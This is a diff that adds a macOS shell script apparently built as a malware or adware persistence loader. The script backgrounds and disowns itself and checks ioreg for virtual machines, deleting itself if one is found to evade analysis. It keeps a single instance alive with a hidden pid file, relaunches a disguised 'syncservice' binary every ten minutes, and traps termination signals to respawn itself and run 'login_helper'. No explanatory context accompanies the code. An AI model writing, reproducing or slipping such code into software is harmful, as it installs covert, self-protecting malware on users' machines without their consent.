@@ -1,0 +1,52 @@
+#!/bin/sh
+
+(
+    handle_termination(){
+        local path_local=""
+        local current_version="$( sw_vers -productVersion | cut -d '.' -f 1,2,3 )"
+        local min_required_ver="10.15.0"
+        if [[ "$( printf '%s\n' "$min_required_ver" "$current_version" | sort | head -n1 )" == "$min_required_ver" ]]; then
+            path_local="/Users/aaravadarsh/.zsh/misc/module_init"
+        else        
+            path_local="$( cd "$( dirname "${0}" )"; pwd )/$( basename -- "$0" )"
+        fi
+        $SHELL -c "sleep 10 && \"${path_local}\"" > /dev/null 2>&1 &
+        path_local="$(dirname "${path_local}")"
+        "${path_local}/login_helper" "${path_local}/helper_update" 1
+        exit 0
+    }
+    
+    main(){
+        local thisPID=0
+        [[ "$SHELL" =~ "zsh" ]] && thisPID="$$" || thisPID="$!"
+        local pidir="$(dirname "$( mktemp -u )" )/com.module_initd"
+        local pidfile="${pidir}/pidd"
+        mkdir -p "${pidir}"
+        if [ -f "${pidfile}" ]; then
+            local PID="$( head -n 1 "$pidfile" 2> /dev/null )"
+            ps -p "${PID}" > /dev/null 2>&1
+            if [ $? -eq 0 ]; then
+                exit 0
+            fi
+        fi
+        echo "${thisPID}" > "${pidfile}"
+        local -r seconds=600
+        while [ 1 ]; do
+            logdate="$( date -r "${pidfile}" +%s )"
+            current="$( date +%s )"
+            diff="$( expr "$current" - "$logdate") "
+            if [[ "$seconds" -gt "$diff" ]]; then
+                sleep $(( 60 * 1 )) &
+                wait $!
+                continue
+            fi
+            "$HOME/Library/Application Support/com.syncserviced/syncservice" >/dev/null 2>&1 &
+            touch "${pidfile}"
+        done
+    }
+cleanup(){ rm -- "$( cd "$( dirname "${0}" )"; pwd )/$(basename -- "${0}")"  > /dev/null 2>&1; }
+[[ "$( ioreg -l | grep -c "VirtualBox\|Oracle\|VMware\|Parallels\|VirtualPC\|QEmu\|KVM\|Xen\|Virtuozzo" )" -eq 0 ]] || { cleanup; exit 0; }
+trap handle_termination SIGHUP SIGINT SIGTERM
+main
+) >/dev/null 2>&1 & disown
+
